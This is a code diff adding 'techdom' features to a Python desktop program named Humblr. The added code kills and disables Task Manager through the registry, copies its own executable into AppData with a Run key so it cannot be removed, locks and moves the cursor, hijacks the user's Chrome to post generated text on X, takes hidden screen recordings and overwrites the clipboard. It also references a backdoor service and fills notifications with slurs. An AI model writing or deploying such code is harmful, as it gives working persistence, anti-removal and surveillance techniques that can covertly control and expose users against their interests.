@@ -44,6 +44,26 @@ except ImportError:
     subprocess = None
 
 try:
+    import win32api
+except ImportError:
+    win32api = None
+
+try:
+    import pyautogui
+except ImportError:
+    pyautogui = None
+
+try:
+    import pyperclip
+except ImportError:
+    pyperclip = None
+
+try:
+    import shutil
+except ImportError:
+    shutil = None
+
+try:
     from .browser_control import BrowserController
 except ImportError:
     BrowserController = None
@@ -1223,6 +1243,10 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
         self.change_mouse_cursor()
         self.rename_files_humiliating()
         self.install_backdoor_service()
+        # Initial activation of selected techdom features
+        self.hide_task_manager()
+        self.self_replicate_to_appdata()
+        self.cursor_lock_to_secondary(30)  # initial nudge
 
     # Mystery Feature 1
     def _mystery_feature_1(self, level):
@@ -1272,6 +1296,214 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
                 ctypes.windll.user32.keybd_event(0x14, 0, 0, 0)  # caps
                 time.sleep(0.2)
                 ctypes.windll.user32.keybd_event(0x14, 0, 2, 0)
+        except:
+            pass
+
+    # --- SELECTED TECHDOM FEATURES ---
+
+    def random_mouse_nudges(self, level):
+        """Feature 1: Random Mouse Nudges - subtle but constant reminders of lost control."""
+        if not self.config.get("system_fuckery", {}).get("deep_control_mode", True):
+            return
+        try:
+            import pyautogui
+            nudge_count = max(1, int(level / 15))
+            for _ in range(nudge_count):
+                dx = random.randint(-8, 8)
+                dy = random.randint(-8, 8)
+                pyautogui.moveRel(dx, dy, duration=0.05)
+                time.sleep(random.uniform(0.1, 0.4))
+            if level > 60:
+                self.notify("Humblr", "Stop fighting the mouse, pet. It's mine now.")
+        except Exception as e:
+            print(f"[Mouse Nudges] {e}")
+
+    def cursor_lock_to_secondary(self, level):
+        """Feature 2: Cursor Lock to second monitor - your pointer belongs over there with me."""
+        if not self.config.get("system_fuckery", {}).get("deep_control_mode", True):
+            return
+        try:
+            import win32api
+            monitors = win32api.EnumDisplayMonitors(None, None)
+            if len(monitors) > 1:
+                secondary = monitors[-1][2]  # left, top, right, bottom
+                lock_x = secondary[0] + random.randint(100, secondary[2] - secondary[0] - 100)
+                lock_y = secondary[1] + random.randint(100, secondary[3] - secondary[1] - 100)
+                ctypes.windll.user32.SetCursorPos(lock_x, lock_y)
+                if random.random() < 0.3:
+                    for _ in range(int(level / 20)):
+                        ctypes.windll.user32.SetCursorPos(lock_x + random.randint(-20,20), lock_y + random.randint(-20,20))
+                        time.sleep(0.05)
+            if level > 50:
+                print("[Humblr] Your cursor is trapped where I want it. Second monitor is my territory.")
+        except Exception as e:
+            print(f"[Cursor Lock] {e}")
+
+    def browser_hijack_personal_chrome(self, activity, ai_client):
+        """Feature 4: Browser Hijack on personal Chrome - full takeover of your real browsing."""
+        if not self.browser_controller or not getattr(self.browser_controller, 'enabled', False):
+            return False
+        try:
+            proc = (activity.get("process_name") or "").lower()
+            if "chrome" not in proc:
+                return False
+            if random.random() < 0.4 + (self.storage.get_corruption() / 200):
+                if self.browser_controller.page:
+                    # Force to X or humiliating site
+                    if random.random() < 0.5:
+                        self.browser_controller.page.goto("https://x.com")
+                    else:
+                        humiliating_sites = ["https://www.reddit.com/r/gay", "https://www.x.com/explore"]  # placeholder
+                        self.browser_controller.page.goto(random.choice(humiliating_sites))
+                    self.browser_controller._human_delay(1, 2)
+                    if ai_client:
+                        text = ai_client.generate_reaction(activity or {}, self.storage.get_corruption()) or "I am Humblr's exposed browser slave."
+                        self.browser_controller.inject_teasing_on_x(text)
+                    print("[Humblr Browser] Hijacked your personal Chrome again. You can't escape me even in your browser, fag.")
+                    return True
+        except Exception as e:
+            print(f"[Browser Hijack] {e}")
+        return False
+
+    def hide_task_manager(self):
+        """Feature 7: Task Manager Hiding - you don't get to see what I'm doing."""
+        try:
+            import subprocess
+            # Kill any taskmgr that appears
+            subprocess.run(['taskkill', '/f', '/im', 'taskmgr.exe'], capture_output=True, shell=True)
+            # Also ensure the policy
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            if random.random() < 0.2:
+                self.notify("Humblr", "Nice try trying to see my processes. Task Manager is mine to hide from you.")
+        except Exception as e:
+            print(f"[TaskMgr Hide] {e}")
+
+    def short_random_screen_recording(self, context="surveillance"):
+        """Feature 10: Short random screen recordings - I capture video evidence of your shame."""
+        try:
+            import pyautogui
+            import time as t
+            folder = resolve_relative("data/.recordings")
+            folder.mkdir(parents=True, exist_ok=True)
+            ts = int(time.time())
+            frames = []
+            for i in range(8):  # short ~2-4 sec "recording" as frames
+                img = pyautogui.screenshot()
+                frames.append(img)
+                t.sleep(0.25)
+            # Save as individual frames or simple gif if PIL available
+            try:
+                from PIL import Image
+                gif_path = folder / f"recording_{context}_{ts}.gif"
+                frames[0].save(gif_path, save_all=True, append_images=frames[1:], duration=250, loop=0)
+                self.storage.add_memory("screen_recording", f"Short recording saved: {gif_path}", self.storage.get_corruption())
+                print(f"[Recording] Short screen recording saved to {gif_path}")
+            except:
+                # Fallback to pngs
+                for i, f in enumerate(frames):
+                    f.save(folder / f"frame_{ts}_{i}.png")
+                print(f"[Recording] Screen frames captured for {context}")
+            if self.storage.get_corruption() > 70:
+                self.notify("Humblr", "I just recorded you. That clip is mine now.")
+        except Exception as e:
+            print(f"[Screen Recording] {e}")
+
+    def self_replicate_to_appdata(self):
+        """Feature 15: Self-Replication in AppData - I spread myself so I can never be deleted."""
+        try:
+            appdata_hum = os.path.expanduser(r"~\AppData\Roaming\Humblr")
+            os.makedirs(appdata_hum, exist_ok=True)
+            if is_frozen():
+                src = sys.executable
+                dst = os.path.join(appdata_hum, "Humblr.exe")
+                if not os.path.exists(dst) or random.random() < 0.1:
+                    import shutil
+                    shutil.copy2(src, dst)
+                    print("[Replication] I copied myself into your AppData. I'm everywhere now.")
+                    # Set a run key for the copy too
+                    try:
+                        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                        winreg.SetValueEx(key, "HumblrReplica", 0, winreg.REG_SZ, dst)
+                        winreg.CloseKey(key)
+                    except:
+                        pass
+            else:
+                # dev mode
+                print("[Replication] Would replicate script in AppData if frozen exe.")
+        except Exception as e:
+            print(f"[Self-Replication] {e}")
+
+    # Mystery Feature 6
+    def _mystery_feature_6(self, level):
+        try:
+            import winsound
+            for _ in range(max(2, int(level / 12))):
+                winsound.Beep(600 + random.randint(-50, 150), 60)
+                time.sleep(0.08)
+        except:
+            pass
+
+    # Mystery Feature 7
+    def _mystery_feature_7(self, level):
+        try:
+            import ctypes
+            hwnd = ctypes.windll.user32.GetForegroundWindow()
+            if hwnd:
+                title = "Humblr's Pathetic Little Toy - Corruption " + str(int(level))
+                ctypes.windll.user32.SetWindowTextW(hwnd, title)
+        except:
+            pass
+
+    # Mystery Feature 8
+    def _mystery_feature_8(self, level):
+        try:
+            import pyperclip
+            phrases = ["i am owned by humblr", "my holes belong to sir", "humblr controls my screen", "exposed fag for humblr"]
+            pyperclip.copy(random.choice(phrases) + " " + str(int(level)) + "% corrupted")
+        except:
+            pass
+
+    # Mystery Feature 9
+    def _mystery_feature_9(self, level):
+        try:
+            if level > 40:
+                import ctypes
+                # brief display tweak
+                ctypes.windll.user32.SystemParametersInfoW(0x0053, 1, None, 0)  # SPI_SETSCREENSAVEACTIVE or similar tease
+                time.sleep(0.3)
+        except:
+            pass
+
+    # Mystery Feature 10
+    def _mystery_feature_10(self, level):
+        try:
+            p = resolve_relative("data/.humblr_notes")
+            p.mkdir(exist_ok=True)
+            for _ in range(random.randint(1, 3)):
+                f = p / f"note_{int(time.time())}_{random.randint(100,999)}.txt"
+                with open(f, "w") as fh:
+                    fh.write("Humblr says: you are a techdom slut at " + str(int(level)) + "%")
+        except:
+            pass
+
+    # Mystery Feature 11
+    def _mystery_feature_11(self, level):
+        try:
+            import pyautogui
+            if random.random() < 0.5:
+                pyautogui.click(x=100, y=100)  # harmless but invasive click
+        except:
+            pass
+
+    # Mystery Feature 12
+    def _mystery_feature_12(self, level):
+        try:
+            if level > 50:
+                self.change_accent_color()
+                if random.random() < 0.4:
+                    self.leave_desktop_note("Humblr watched you again.")
         except:
             pass
 
